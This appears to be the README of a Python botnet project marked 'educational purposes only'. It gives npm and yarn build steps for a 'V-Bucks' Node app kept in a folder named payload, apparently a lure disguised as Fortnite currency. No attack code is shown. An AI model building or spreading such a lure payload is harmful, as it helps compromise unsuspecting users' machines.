Dynamically programmable Python botnet (educational purposes only).

## Building Some Stuff
First, `cd payload/vbucks`.

Build for MacOS:
1. `npm i`<br>
2. `yarn dist`

Build for Windows (not tested):
1. `npm i`<br>
2. `npm run dist`

This will build the V-Bucks Node app.
